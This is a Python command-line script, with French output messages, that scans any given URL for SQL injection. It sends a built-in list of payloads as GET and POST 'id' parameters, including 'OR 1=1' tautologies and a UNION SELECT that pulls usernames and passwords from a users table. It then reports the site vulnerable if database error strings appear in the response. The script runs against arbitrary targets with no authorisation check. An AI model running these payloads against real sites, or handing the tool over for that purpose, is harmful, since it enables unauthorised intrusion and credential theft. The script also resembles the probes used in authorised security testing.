import requests
import re
import sys
from urllib.parse import urlparse

class SQLiTester:
    def __init__(self, url):
        self.original_url = url
        self.url = self.prepare_url(url)
        self.payloads = [
            "' OR 1=1 --",
            "' OR '1'='1' --",
            "' OR 1=1#",
            "' OR '1'='1'#",
            "' AND 1=2 UNION SELECT NULL, username, password FROM users --",
            "' AND 1=2 UNION SELECT NULL, NULL, NULL --"
        ]
        self.headers = {
            "User-Agent": "Mozilla/5.0 (SQLi-Scanner)"
        }

    def prepare_url(self, url):
        if '?' not in url:
            return url.rstrip('/') + "?id="
        return url

    def test_sql_injection(self):
        is_vulnerable = False

        # Test GET with payloads
        for payload in self.payloads:
            test_url = self.url + payload
            try:
                response = requests.get(test_url, headers=self.headers, timeout=5)
                if self.check_error(response.text):
                    is_vulnerable = True
                    break
            except requests.RequestException:
                continue

        # Test POST with payloads
        if not is_vulnerable:
            for payload in self.payloads:
                try:
                    response = requests.post(self.original_url, data={'id': payload}, headers=self.headers, timeout=5)
                    if self.check_error(response.text):
                        is_vulnerable = True
                        break
                except requests.RequestException:
                    continue

        if is_vulnerable:
            print("🚨 Le site est vulnérable avec SQL injection.")
        else:
            print("✅ Le site n'est pas vulnérable avec SQL injection.")

    def check_error(self, response_text):
        sql_errors = [
            "You have an error in your SQL syntax",
            "mysql_fetch_array()",
            "Warning: mysql_",
            "ODBC Driver",
            "Unclosed quotation mark",
            "PostgreSQL query failed",
            "SQL syntax error"
        ]
        return any(re.search(error, response_text, re.IGNORECASE) for error in sql_errors)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 sqli_scanner.py <URL>")
        sys.exit(1)

    target_url = sys.argv[1]
    tester = SQLiTester(target_url)
    tester.test_sql_injection()
